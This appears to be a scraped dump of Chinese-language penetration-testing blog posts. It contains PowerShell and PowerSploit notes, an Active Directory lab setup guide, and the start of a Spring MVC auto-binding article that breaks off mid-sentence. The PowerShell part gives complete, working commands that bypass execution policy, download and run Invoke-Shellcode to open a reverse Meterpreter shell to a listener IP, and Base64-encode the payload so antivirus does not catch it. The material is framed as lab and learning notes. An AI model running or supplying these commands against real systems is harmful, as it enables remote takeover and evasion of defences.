TrueIsRunspacePushed : FalseRunspace : System.Management.Automation.Runspaces.LocalRunspacePS E:\\&gt; $PSVersionTable.PSVersionMajor Minor Build Revision----- ----- ----- --------5 1 18362 628 0x02 PowerShell脚本PowerShell脚本其实就是一个扩展名为”.ps1”的文件，其中包含一系列PowerShell命令，每个命令显示为独立的一行。 脚本运行运行PowerShell脚本需要输入绝对路径，比如E:\\test.ps1。如果PowerShell脚本刚好在系统目录中，则只需要.\\test.ps1执行即可，这和Linux上执行Shell脚本是一样的。 当然，PowerShell是分32位和64位的。在64位的Windows上，同时存在x64和x86两个版本的PowerShell，并且这两个版本的执行策略互不影响，即相互独立。 x64版本的PowerShell的配置文件在%WinDir%\\SysWOW64\\WindowsPowerShell\\v1.0\\目录下。 运行32位PowerShell脚本命令如下： 1powershell.exe -NoP -NonI -W Hidden -Exec Bypass 运行64位PowerShell脚本命令如下： 1%WinDir%\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe -NoP -NonI -W Hidden -Exec Bypass 执行策略为了防止使用者运行恶意脚本，PowerShell提供了一个执行策略。在默认情况下，这个执行策略被设置为“不能运行”。 如果PowerShell脚本不能运行，可以使用如下的cmdlet命令查询当前的执行策略： 12PS E:\\&gt; Get-ExecutionPolicyRestricted 这里看到是Restricted即限制不能执行的意思。我们看下执行策略的几个值： Restricted：脚本不能运行（默认设置）； RemoteSigned：在本地创建的脚本可以运行，但不能运行网上下载的脚本（拥有数字证书的除外）； AllSigned：仅当脚本由受信任的发布者签名时才能运行； Unrestricted：允许所有脚本运行； 可以使用下面的cmdlet命令设置PowerShell的执行策略： 1PS E:\\&gt; Set-ExecutionPolicy &lt;policy name&gt; 管道符在PowerShell中也支持管道符|的使用。 管道的作用就是将一个命令的输出作为另一个命令的输入，两个命令之间用|连接。 0x03 PowerShell常用命令与利用技巧在Windows命令提示符即cmd.exe中输入powershell命令即可切入PowerShell命令行环境。也可以直接在当前目录Shift+右键&gt;在此处打开PowerShell窗口（win10）。其中输入help命令可以显示帮助菜单： 1234567891011121314E:\\&gt;powershellWindows PowerShell版权所有 (C) Microsoft Corporation。保留所有权利。尝试新的跨平台 PowerShell https://aka.ms/pscore6PS E:\\&gt; help主题Windows PowerShell 帮助系统简短说明显示有关 Windows PowerShell 的 cmdlet 及概念的帮助。... 常用命令在PowerShell中，类似cmd命令的命令称为cmdlet命令。两者的命名规范一致，都采用“动词-名词”的方式，动词部分一般是Add、New、Get、Set、Remove等。命令的别名一般兼容Windows Command和Linux Shell。另外PowerShell命令不区分大小写。 几个常用命令： 几个常用的文件操作命令： 下面以文件操作为例： 新建目录：New-ltem whitecellclub-ltemType Directory； 新建文件：New-ltem light.txt-ltemType File； 删除目录：Remove-ltem whitecellclub； 显示文本内容：Get-Content test.txt； 设置文本内容：Set-Content test.txt-Value ‘’hello,word! ‘’； 追加内容：Add-Content light.txt-Value ‘’i love you ‘’； 清除内容：Clear-Content test.txt PowerSploit——后渗透测试框架PowerSploit是一款基于PowerShell的后渗透测试框架，其中包含很多PowerShell脚本，主要用于渗透测试中的信息收集、权限提升、权限维持。 项目地址：https://github.com/PowerShellMafia/PowerSploit 它包含以下几个模块： CodeExecution：在目标机器执行代码； ScriptModification：修改或准备脚本以在受感染的计算机上执行； Persistence：向PowerShell脚本添加持久性功能； AntivirusBypass：使PowerShell绕过防病毒； Exfiltration：窃取数据； Mayhem：使用PowerShell引起一般的混乱； Privesc：帮助提升目标特权的工具； Recon：在渗透测试的侦察阶段提供帮助的工具； 利用技巧由前面知道，要想运行PowerShell脚本，必须使用管理员权限将执行策略从Restricted改为Unrestricted。 Bypass本地权限并执行将PowerShell脚本文件test.ps1上传至目标服务器。在命令行环境下，执行如下命令，绕过安全策略，在目标服务器本地执行该脚本： 1PowerShell.exe -ExecutionPolicy Bypass -File test.ps1 示例： 在实际的内网渗透中，将PowerSploit中Privesc模块的PowerUp.ps1脚本上传到目标服务器中，在目标本地执行脚本文件，命令如下： 1powershell.exe -exec bypass -Command \"&amp; &#123;Import-Module E:\\PowerUp.ps1; Invoke-AllChecks&#125;\" 这里PowerUp旨在成为依赖错误配置的常见Windows特权升级向量的交换所。运行Invoke-AllChecks将输出所有可识别的漏洞以及任何滥用功能的规范。换句话说，Invoke-AllChecks函数将检查目标主机的攻击向量以进行权限提升 从网站服务器中下载脚本，Bypass本地权限并隐藏执行下载脚本的命令如下： 1PowerShell.exe -ExecutionPolicy Bypass-WindowStyle Hidden-NoProfile-NonI IEX(New-ObjectNet.WebClient).DownloadString(\"xxx.ps1\");[Parameters] 几个常用参数说明如下： -ExecutionPolicy Bypass（-Exec Bypass）：绕过执行安全策略，这个参数非常重要。在默认 情况下，PowerShell 的安全策略规定了 PowerShell 不允许运行命令和文件。通过设置这个 参数，可以绕过任意安全保护规则。在渗透测试中，通常每次运行 PowerShell 脚本时都要 使用这个参数； -WindowStyle Hidden（-W Hidden）：隐藏窗口； -Nonlnteractive（-NonI）：非交互模式。PowerShell不为用户提供交互的提示； -NoProfile（-NoP）：PowerShell控制台不加载当前用户的配置文件； -noexit：执行后不退出Shell。这在使用键盘记录等脚本时非常重要； -NoLogo：启动不显示版权标志的PowerShell； 这里使用PowerSploit中CodeExecution模块中Invoke-Shellcode.ps1脚本在目标机器上执行Meterpreter Shell。 这里我们需要知道使用什么参数，直接看源码了解如何调用反向HTTPS Meterpreter Shell： 因此，最终构造如下payload： 1PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -NonI IEX(New-Object Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1\"); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.10.137 -Lport 666 先在Kali上打开MSF，使用后门模块exploit/multi/handler，并选择payload为windows/meterpreter/reverse_https，接着设置监听地址和端口后启动监听： 然后在Win10中的PowerShell中输入payload，发现会报如下错误： 此时msf是接收到反弹的请求的，但是并不会成功获得反弹的Meterpreter Shell： 那我们换个环境，在Win7上测试一下，经过几番折腾，去掉几个payload的参数就能成功执行反弹shell（注意，在cmd命令行下双引号要改为单引号，不然报错）： 1PowerShell.exe -ExecutionPolicy Bypass -NoProfile IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.10.137 -Lport 666 直接在win7的cmd中输入payload： 此时在Kali的msf中成功获取到Meterpreter Shell： 这里注意，不能直接在win7的PowerShell终端输入该payload，会显示如下错误： 这可能是win7和win10的PowerShell版本不一致导致的某些差异，具体原因还未知，但我们可以使用如下形式在win7的PowerShell终端来执行反弹shell，简单地说就是设置执行策略为无限制，然后直接远程下载恶意PowerShell脚本并执行： 1Set-ExecutionPolicy Unrestricted; IEX(New-object Net.WebClient).DownloadString(\"https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1\"); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.10.137 -Lport 666 在msf中同样获取到反弹shell： 使用Base64对PowerShell命令进行编码使用Base64编码PowerShell命令可以起到混淆和压缩代码的作用，避免一些特殊字符导致脚本被杀毒软件所查杀。这里使用大佬写的一个Python脚本文件ps_encoder.py，其使用Base64编码封装的PowerShell命令包，其目的是混淆和压缩代码。 该脚本编码的对象必须是文本文件，这里需要先将命令保存为文本文件，然后调用该脚本编码即可： 1234567root@kali:~/Desktop# echo \"IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.10.137 -Lport 666 -Force\" &gt;raw.txtroot@kali:~/Desktop# cat raw.txt IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploit/master/CodeExecution/Invoke--Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.10.137 -Lport 666 -Forceroot@kali:~/Desktop# chmod +x ps_encoder.py root@kali:~/Desktop# python ps_encoder.py -s raw.txtSQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGMAaABlAGUAdAB6AC8AUABvAHcAZQByAFMAcABsAG8AaQB0AC8AbQBhAHMAdABlAHIALwBDAG8AZABlAEUAeABlAGMAdQB0AGkAbwBuAC8ASQBuAHYAbwBrAGUALQAtAFMAaABlAGwAbABjAG8AZABlAC4AcABzADEAJwApADsAIABJAG4AdgBvAGsAZQAtAFMAaABlAGwAbABjAG8AZABlACAALQBQAGEAeQBsAG8AYQBkACAAdwBpAG4AZABvAHcAcwAvAG0AZQB0AGUAcgBwAHIAZQB0AGUAcgAvAHIAZQB2AGUAcgBzAGUAXwBoAHQAdABwAHMAIAAtAEwAaABvAHMAdAAgADEAOQAyAC4AMQA2ADgALgAxADAALgAxADMANwAgAC0ATABwAG8AcgB0ACAANgA2ADYAIAAtAEYAbwByAGMAZQAKAA==root@kali:~/Desktop# 得到Base64编码后的命令内容之后，直接在目标主机的cmd终端上执行如下命令： 1PowerShell.exe -NoP -NonI -Exec Bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAGMAaABlAGUAdAB6AC8AUABvAHcAZQByAFMAcABsAG8AaQB0AC8AbQBhAHMAdABlAHIALwBDAG8AZABlAEUAeABlAGMAdQB0AGkAbwBuAC8ASQBuAHYAbwBrAGUALQAtAFMAaABlAGwAbABjAG8AZABlAC4AcABzADEAJwApADsAIABJAG4AdgBvAGsAZQAtAFMAaABlAGwAbABjAG8AZABlACAALQBQAGEAeQBsAG8AYQBkACAAdwBpAG4AZABvAHcAcwAvAG0AZQB0AGUAcgBwAHIAZQB0AGUAcgAvAHIAZQB2AGUAcgBzAGUAXwBoAHQAdABwAHMAIAAtAEwAaABvAHMAdAAgADEAOQAyAC4AMQA2ADgALgAxADAALgAxADMANwAgAC0ATABwAG8AcgB0ACAANgA2ADYAIAAtAEYAbwByAGMAZQAKAA== 这里为了看下有没有错误就不添加-W Hidden参数设置隐藏窗口了，而且添加了还没成功反弹shell： 然后在Kali的msf中获取到Meterpreter Shell：","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.mi1k7ea.com/tags/渗透测试/"},{"name":"Windows","slug":"Windows","permalink":"https://www.mi1k7ea.com/tags/Windows/"},{"name":"内网渗透","slug":"内网渗透","permalink":"https://www.mi1k7ea.com/tags/内网渗透/"}]},{"title":"内网渗透基础与域环境搭建","date":"2020-02-15T12:34:33.000Z","path":"2020/02/15/内网渗透基础/","text":"0x00 参考《内网安全攻防》笔记。 0x01 内网基本概念工作组工作组（Work Group）是局域网中的一个概念。它是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管理。在这个概念中，并不存在集中管理的节点，即无服务器和客户机的区分。 怎么设置工作组？——右键我的电脑-&gt;属性-&gt;更改设置-&gt;更改： 域Windows域是计算机网络的一种形式，其中所有用户帐户 ，计算机，打印机和其他安全主体都在位于称为域控制器的一个或多个中央计算机集群上的中央数据库中注册。 身份验证在域控制器上进行。 在域中使用计算机的每个人都会收到一个唯一的用户帐户，然后可以为该帐户分配对该域内资源的访问权限。Windows域的概念与工作组的概念形成对比，在该工作组中，每台计算机都维护自己的安全主体数据库。 域(Domain)是Windows网络中独立运行的单位，域之间相互访问则需要建立信任关系(即Trust Relation)。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后，2个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理，以及相互通信和数据传输。 域既是 Windows 网络操作系统的逻辑组织单元，也是Internet的逻辑组织单元，在 Windows 网络操作系统中，域是安全边界。域管理员只能管理域的内部，除非其他的域显式地赋予他管理权限，他才能够访问或者管理其他的域，每个域都有自己的安全策略，以及它与其他域的安全信任关系。 域控制器（DC）域控制器（Domain Controller，简写为DC）是指在“域”模式下，至少有一台服务器负责每一台联入网络的电脑和用户的验证工作，相当于一个单位的门卫一样。域内的计算机若想互相访问，需要经过域控制器的审核。域控制器中存在由这个域的账户、密码、属于这个域的计算机等信息构成的数据库。当电脑联入网络时，域控制器首先要鉴别这台电脑是否是属于这个域的，用户使用的登录账号是否存在、密码是否正确。如果以上信息有一样不正确，那么域控制器就会拒绝这个用户从这台电脑登录。不能登录，用户就不能访问服务器上有权限保护的资源，他只能以对等网用户的方式访问Windows共享出来的资源，这样就在一定程度上保护了网络上的资源。 单域单域即只有一个域，通常满足小公司的需求。一般来说至少两个域服务器，一台作为DC，另一台作为备份DC。 父域和子域出于管理和其他一些需求，需要在网络中划分多个域。其中第一个域称为父域，各分部的域称为该域的子域。 域树域树由多个域组成，这些域共享同一表结构和配置，形成一个连续的名字空间。 树中的域通过信任关系连接起来，活动目录包含一个或多个域树。域树中的域层次越深级别越低，一个“.”代表一个层次，如域child.Microsoft.com 就比 Microsoft.com这个域级别低，因为它有两个层次关系，而Microsoft.com只有一个层次。而域Grandchild.Child.Microsoft.com又比 Child.Microsoft.com级别低，道理一样。他们都属于同一个域树。Child.Microsoft.com就属于Microsoft.com的子域。 多个域树可以组成一个域林。 域林域林是指由一个或多个没有形成连续名字空间的域树通过建立信任关系组成的集合，它与域树最明显的区别就在于域林之间没有形成连续的名字空间，而域树则是由一些具有连续名字空间的域组成。 域名服务器DNS（Domain Name Server，域名服务器）是进行域名(domain name)和与之相对应的IP地址 (IP address)转换的服务器。DNS中保存了一张域名(domain name)和与之相对应的IP地址 (IP address)的表，以解析消息的域名。 域名是Internet上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位（有时也指地理位置）。域名是由一串用点分隔的名字组成的，通常包含组织名，而且始终包括两到三个字母的后缀，以指明组织的类型或该域所在的国家或地区。 在前面域树中看到域树中的域名和DNS域名很像。因为域中的计算机是使用DNS来定位域控制器、服务器和其他计算机、网络服务的，因此域的名字就是DNS域的名字。 对于内网渗透而言，一般是通过寻找DNS服务器来确定域控制器的位置的（通常DNS服务器和域控制器配置在同一台机器上）。 域中计算机的分类在域中，计算机一般分为：域控制器、成员服务器、客户机、独立服务器等。 其中域控制器是域所必需的，因为其存放活动目录数据库。 域控制器DC的概念在前面已说过。 可以在网络中配置多态DC，用来分担用户的登录、访问等操作。多个DC可以一起工作，自动备份用户账户和活动目录数据，提高网络的安全性和稳定性。 成员服务器成员服务器是指安装了服务器OS并加入了域、但没有安装活动目录的计算机，其主要任务是提供网络资源。 成员服务器的类型通常有文件服务器、应用服务器、数据库服务器、Web服务器、邮件服务器、防火墙、远程访问服务器、打印服务器等。 客户机客户机是域中用户使用的计算机，用户通过客户机和域中的账户就能登录访问域。 独立服务器独立服务器和域没啥关系。如果服务器没加入域，也没安装活动目录，则称为独立服务器。 独立服务器可以创建工作组、与网络中的其他计算机共享资源，但不能使用活动目录提供的任何服务。 域内权限组（Group）是用户账号的集合。通过向一组用户分配权限，就可以不必向每个用户分别分配权限。 下面看下几个类型的组。 域本地组域本地组是指多域用户访问单域资源（访问同一个域），主要用于授权本域内资源的访问权限。 域本地组的成员可以来自域林中的任何域，域本地组用来访问同一域中的资源。 全局组全局组是指单域用户访问多域资源（必须是一个域里面的用户），只能在创建该全局组的域中添加用户和全局组。 全局组的成员可包括其所在域中的其他组和账户，而且可在林中的任何域中指派权限。 通用组通用组是指多域用户访问多域资源。 通用组的成员可包括域树或域林中任何域的其他组和账户，而且可在该域树或域林中的任何域中指派权限。 小Trick 域本地组：来自全林，作用于本域； 全局组：来自本域，作用于全林； 通用组：来自全林，作用于全林； A-G-DL-P策略A-G-DL-P策略（A：Account，用户账号；G：Global Group，全局组；DL：Domain Local Group，域本地组；P：Permission，资源权限）是指将用户账号添加到全局组中，将全局组添加到域本地组中，然后为域本地组分配资源权限。 A-G-DL-P策略是为了方便对用户进行组织和管理。当需要给一个用户添加某个权限时，只需要把这个用户添加到某一个域本地组中就可以了。 内置组在安装DC时，系统会自动生成一些组，即内置组。内置组内定义了一些常用的权限。通过将用户添加到内置组中，可以是用户获得相应的权限。 “Active Directory 用户和计算机”中的”Builtin”和”Users”组织单元中的组就是内置组，内置的域本地组在”Builtin”中，内置的全局组和通用组在”Users”中。 几个比较重要的域本地组权限： 管理员组（Administrators）的成员可以完全不受限制地存取计算机/域的资源，不仅是最具权力的一个组，也是在活动目录和域控制器中具有默认的管理员权限的组。该组的成员可以更改 Enterprise Admins、Schem Admins 和 Domain Admins 组的成员关系，是域森林中强大的服务管理组。 远程登录组（Remote Desktop Users）的成员被授予远程登录的权限。 打印机操作员组（Print Operators）的成员可以管理网络打印机，包括建立、管理及删除网络打印机，并可以在本地登录和关闭域控制器。 账号操作员组（Account Operators）的成员可以创建和管理该域中的用户和组，并可以设置其权限，但是，不能更改隶属 Administrators 或 Domain Admins 组的账户，也不能修改这些组。Account Operators 可以在本地登录域控制器。在默认情况下，该组中没有成员。 服务器操作员组（Server Operators）的成员可以管理域服务器，包括建立/管理/删除任何服务器的共享目录、管理网络打印机、备份任何服务器的文件、格式化服务器硬盘、锁定服务器，以及变更服务器的系统时间等权限，并能关闭域控制器。在默认情况下，该组中没有成员。 备份操作员组（Backup Operators）的成员可以在域控制器上执行备份和还原操作，并可以在本地登录和关闭域控制器。在默认情况下，该组中没有成员。 几个比较重要的全局组、通用组的权限： 域管理员组（Domain Admins）的成员在所有加入域的服务器和工作站、域控制器和活动目录上均默认拥有完整的管理员权限。因为该组会被添加到自己所在域的 Administrators 组 中，因此可以继承 Administrators 组的所有权限。同时，该组默认会被添加到每台域成员计算机的本地 Administrators 组中，这样，Domain Admins 就对域中的所有计算机拥有了所有权。如果希望某用户成为域系统管理器，建议将该用户加至 Domain Admins 组中，而不要直接将该用户添加到 Administrators 组中。 企业系统管理员组（Enterprise Admins）是域森林根域中的一个组。该组在域森林中的每个域内都是 Administrators 组的成员，因此对所有域控制器都有完全访问权。 架构管理员组（Schema Admins）是域森林根域中的一个组，可以修改活动目录域森林的模式。由于管理员组是提供活动目录和域控制器完整权限的域用户组，该组成员的资格是非常重要的。 域用户组（Domain Users）是所有域的成员。在预设的情况下，任何由我们建立的用户账户都是 Domain Users 组的成员，而任何由我们建立的计算机账户都是 Domain Computers 组的成员。因此，如果想让所有账户都具有某种资源存取权限，可以将该权限指定给 Domain Users 组，或者让 Domain Users 组属于具有该权限的组。Domain Users 组在预设的情况下是内建域局域 Users 组的成员。 活动目录活动目录（Active Directory，简称AD）是指域环境中提供目录服务的组件。AD存储了有关网络对象（比如用户、组、计算机、共享资源、打印机等）的信息，并且让管理员和用户能够轻松地查找和使用这些信息。AD使用了一种结构化的数据存储方式，并以此作为基础对目录信息进行合乎逻辑的分层组织。 域树/域林内的所有域共享一个活动目录，每个域只存储该域内的数据。 活动目录(Active Directory)主要提供以下功能： 服务器及客户端计算机管理：管理服务器及客户端计算机账户，所有服务器及客户端计算机加入域管理并实施组策略。 用户服务：管理用户域账户、用户信息、企业通讯录（与电子邮件系统集成）、用户组管理、用户身份认证、用户授权管理等，按省实施组管理策略。 资源管理：管理打印机、文件共享服务等网络资源。 桌面配置：系统管理员可以集中的配置各种桌面配置策略，如：用户使用域中资源权限限制、界面功能的限制、应用程序执行特征限制、网络连接限制、安全配置限制等。 应用系统支撑：支持财务、人事、电子邮件、企业信息门户、办公自动化、补丁管理、防病毒系统等各种应用系统。 域控制器与活动目录的区别 AD库：活动目录数据库，是指用于将大型网络中众多的对象（如计算机、用户、用户组、打印机、共享文件等）分类存放并将检索信息整理好以便于查找、管理和使用这些对象的数据库。 可知，这个AD库是实现域环境的关键。如果内网中某台计算机安装了AD，那么它就成为了DC（用于存储活动目录数据库的计算机）。 安全域的划分安全域划分即将同一安全等级的计算机划入同一个的网段，这样这些计算机都拥有相同的网络边界，并在网络边界上通过部署防火墙来实现对其他安全域的网络访问控制策略（NACL）。在一个用路由器连接的局域网中,我们可以将网络划分为三个区域：安全级别最高的LAN Area（内网），安全级别中等的DMZ区域和安全级别最低的Internet区域（外网）。三个区域因担负不同的任务而拥有不同的访问策略。 而安全域的划分一般分为DMZ和内网。 典型的中小型内网的安全域划分如图，这里有两个安全域即两个虚线划出来的安全边界： DMZ两个防火墙之间的空间被称为DMZ。安全性：Internet &lt; DMZ &lt; 内网。 DMZ（Demilitarized Zone），隔离区，也称非军事化区。它是为了解决安装防火墙后外部网络的访问用户不能访问内部网络服务器的问题，而设立的一个非安全系统与安全系统之间的缓冲区。该缓冲区位于企业内部网络和外部网络之间的小网络区域内。在这个小网络区域内可以放置一些必须公开的服务器设施，如企业Web服务器、FTP服务器和论坛等。另一方面，通过这样一个DMZ区域，更加有效地保护了内部网络。因为这种网络部署，比起一般的防火墙方案，对来自外网的攻击者来说又多了一道关卡。 DMZ的屏障功能： 内网可以访问外网：内网的用户显然需要自由地访问外网。在这一策略中，防火墙需要进行源地址转换。 内网可以访问DMZ：此策略是为了方便内网用户使用和管理DMZ中的服务器。 外网不能访问内网：很显然，内网中存放的是公司内部数据，这些数据不允许外网的用户进行访问。 外网可以访问DMZ：DMZ中的服务器本身就是要给外界提供服务的，所以外网必须可以访问DMZ。同时，外网访问DMZ需要由防火墙完成对外地址到服务器实际地址的转换。 DMZ访问内网有限制：很明显，如果违背此策略，则当入侵者攻陷DMZ时，就可以进一步进攻到内网的重要数据。 DMZ不能访问外网：此条策略也有例外，比如DMZ中放置邮件服务器时，就需要访问外网，否则将不能正常工作。在网络中，非军事区(DMZ)是指为不信任系统提供服务的孤立网段，其目的是把敏感的内部网络和其他提供访问服务的网络分开，阻止内网和外网直接通信，以保证内网安全。 内网内网在安全域划分中是安全级别最高的，其中可以分为办公区和核心区。 0x02 内网域环境搭建内网渗透很大程度上就是域渗透，这里使用Windows Server 2012 R2、Windows Server 2008 R2和Windows 7搭建最为简单的迷你型域环境，其中将Windows Server 2012 R2服务器安装AD升级为DC，然后将Windows Server 2008 R2和Windows 7加入到该域中。此外，再安装Monowall来构建含有防火墙的二级内网。 下面推荐几个下载OS镜像的地址： https://msdn.itellyou.cn/ https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/ https://pcriver.com/operating-systems/windows-xp-professional-iso-download.html 注意，为了 更逼真的内网环境，两台机子的虚拟网卡都选择Host-only模式。 搭建域控制器这里先安装好Windows Server 2012 R2系统，按如下步骤操作。 设置IP这里设置服务器IP为192.168.1.1，而且一般域控制器和DNS服务器都是装在一起的，因此DNS服务器地址也写本机就好： 更改计算机名在“控制面板-&gt;系统和安全-&gt;系统”中点击“更改设置-&gt;更改”，然后把计算机名改为“DC”，点击确定后重启计算机生效。 安装域控制器和DNS服务Windows Server 2012 R2在开机时会自动打开服务器管理器，我们直接点击“添加角色和功能”： 保持默认设置，单击“下 一步”按钮，进入“安装类型”页面。选择“基于角色或者基于功能的安装”选项，单击“下一 步”按钮，进入“服务器选择”选择页面。目前的服务器池中只有当前这一台机器，保持默认设置。单击“下一步”按钮，在“服务器角色”页面勾选“Active Directory 域服务”和“DNS 服务器”复选框： 在“功能”页面，保持默认设置，单击“下一步”按钮，进入“确认”页面。确认需要安装 的组件后，勾选“如果需要，自动重新启动目标服务器”复选框，然后单击安装： 升级服务器 Active Directory 域服务安装完成后，需要将此服务器提升为域控制器。单击“将此服务器提 升为域控制器”选项（如果不慎单击了“关闭”按钮，可以在“服务器管理器”页面中打开相关 页面），在右上角可以看到一个中间有“！”的三角形按钮。单击该按钮，提升服务器： AD 域服务安装完成。接着，进入“Active Directory 域服务配置向导”页面，在部署操作中单 击选中“添加新林”单选按钮并输入根域名（必须使用允许的 DNS 域命名约定） 。将根域名设置 为“hacke.testlab”： 在“域控制器选项”页面，将林功能级别、域功能级别都设置为 Windows Server 2012 R2，如图所示。在创建新林时，在默认情况下选择 DNS 服务器，林中的第一个域控制器必须是全局目录服务器且不能是只读域控制器（RODC） 。输入目录服务还原模式密码，在开机进入安全模式修复 AD 数据库时将使用此密码。 在 DNS 选项页面会出现关于 DNS 的警告。不用理会该警告，保持默认设置。单击“下一步” 按钮，进入“其他选项”页面，在 NetBIOS 域名（不支持DNS 域名的旧系统，如 Windows 98、 NT 系统，需要通过 NetBIOS 域名进行通信）页面保持默认设置。单击“下一步”按钮，进入“路 径”界面，指定数据库、日志、sysvol 的存放位置，其他选项保持默认设置。接着单击“下一步” 按钮，保持页面上的默认设置。当到了先决条件检查时，会检测出当前Administrator用户密码不符合要求，这是因为Administrator用户将成为域Administrator用户了： 此时我们去创建或修改Administrator用户的密码后再点击“重新运行先决条件检测”，这时候发现就OK了，直接单击“安装”即可。 安装完成后，需要重启服务器。重启完成后，需要使用域管理员账户（HACKE\\Administrator）登录。此时在“服 务器管理器”页面就可以看到 AD DS、DNS 服务了，如图所示。 创建Active Directory用户为Windows 7创建域控账户，在“Active Directory 用户和计算机”页面转到“Users”目录并单击右键，添加新用户： 创建一个testuser账户： 配置Windows 7加入该域将Windows 7系统加入该域，先设置IP地址为192.168.1.2，DNS地址为192.168.1.1， 然后查看设置并运行ping hacker.testlab命令进行测试： 接下来，将主机加入域，更改计算机名为“WIN7-x64”，将域名更改为 “hacker.testlab”。 单击“确定”按钮后，会弹出要求输入拥有权限的域账户名称和密码的对话框。 在这里，输入域管理员用户账号和密码： 操作成功后，会出现重启计算机的提示。用创建的testuser用户登录域即可。 此时，我们在DC中“Active Directory 用户和计算机”页面的Computers项可以看到Win7加入的计算机名： 当我们右键该项选择“所有任务-&gt;管理”时，会报如下错误，这是防火墙拦截的原因： 此时，为了方便，就直接将Win7上的防火墙关闭掉就好，当然在当前域环境下，在Win7进行相关操作时需要DC的adminsitrator用户权限才能操作的： 此时回到DC，我们就能成功管理这台Win7了： 配置Windows Server 2008 R2加入该域同Win7上面的操作一样，看下结果就好： 通过防火墙m0n0wall构建二级内网m0n0wall简介m0n0wall 是一个完整的、嵌入式的防火墙软件包，该软件包可以安装于嵌入式PC里。m0n0wall基于bare-bones version of FreeBSD，包括一个WEB服务器，PHP和另一些工具软件。整个系统的配置保存在一个XML文件当中。m0n0wall可能是第一个启动时通过PHP配置的UNIX系统。m0n0wall编写者认为m0n0wall不包含在第3层 和第4层防火墙的基础服务外的任何功能。因为m0n0wall是嵌入式的防火墙面向嵌入设备有限的CPU资源和记忆体资源。m0n0wall不允许登录： 在控制台没有登录提示符，（它被一个功能菜单代替） ,没有任何Telnet或SSH守护程序。 官网：https://m0n0.ch/wall/index.php 含中文版的下载地址：http://www.cat-home.org/?action=show&amp;id=158 m0n0wall安装在VM中新建虚拟机，打开对应的iso文件，选择FreeBSD版本，内存选择10G即可。 都点击确认好之后，重点在于还需要给该虚拟机添加多一个网卡，即一个为Host-only模式用于内网，另一个为桥接模式连接外网： 之后启动虚拟机即可开启安装。 首先是需要安装到硬盘中，选择7： 接着选择硬盘，这里只有一块名为ad3的硬盘，选择它并输入确认y： 此时只需等待安装完成。 网卡接口分配重启之后进入如下界面，我们先输入1来进行网卡接口的分配： 如图输入，第一个设置LAN即内网网卡的填em0即通过Mac地址找到的对应Host-only那个网卡，第二个设置WAN即外网网卡的填em1即通过Mac地址找到的对应桥接那个网卡： 之后重启即可。","tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://www.mi1k7ea.com/tags/渗透测试/"},{"name":"内网渗透","slug":"内网渗透","permalink":"https://www.mi1k7ea.com/tags/内网渗透/"}]},{"title":"浅析自动绑定漏洞之Spring MVC","date":"2020-02-12T13:40:37.000Z","path":"2020/02/12/浅析自动绑定漏洞之Spring-MVC/","text":"0x01 Spring MVC自动绑定漏洞自动绑定漏洞自动绑定功能在很多框架中都有实现，主要功能是允许软件框架自动将HTTP请求中的参数绑定到程序变量或对象中以便于开发者访问。 而自动绑定漏洞的漏洞点在于，攻击者可能将额外的HTTP请求参数绑定到一个对象上，使用这种方法来创建、修改、更新开发人员或者业务本身从未打算设计到的参数，而这些新参数反过来又会影响程序代码中不需要的新变量或对象，进而触发一些业务逻辑漏洞。 一般而言，自动绑定漏洞的发现是通过白盒审计的形式才能找到的。 Spring MVC中两个关键注解在Spring MVC框架中与自动绑定漏洞相关的注解有如下两个。 @ModelAttribute注解通过@ModelAttribute注解可实现以下两个功能： 1、绑定请求参数到实体对象（表单的命令对象） @ModelAttribute注解运用在参数上，会将客户端传递过来的参数按名称注入到指定对象中，并且会将这个对象自动加入ModelMap中，便于View层使用。 如下代码： 123456789@RequestMapping(\"/register\")public String register(@ModelAttribute(\"user\") UserForm user) &#123; if (\"zhangsan\".equals(uname) &amp;&amp; \"123456\".equals(upass)) &#123; logger.info(\"成功\"); return \"login\"; &#125; else &#123; logger.info(\"失败\"); return \"register\";&#125; 在上述代码中@ModelAttribute（&quot;user&quot;）UserForm user语句的功能有两个： 将请求参数的输入封装到user对象中。 创建UserForm实例。 以“user”为键值存储在Model对象中，和model.addAttribute(&quot;user&quot;，user)语句的功能一样。如果没有指定键值，即@ModelAttribute UserForm 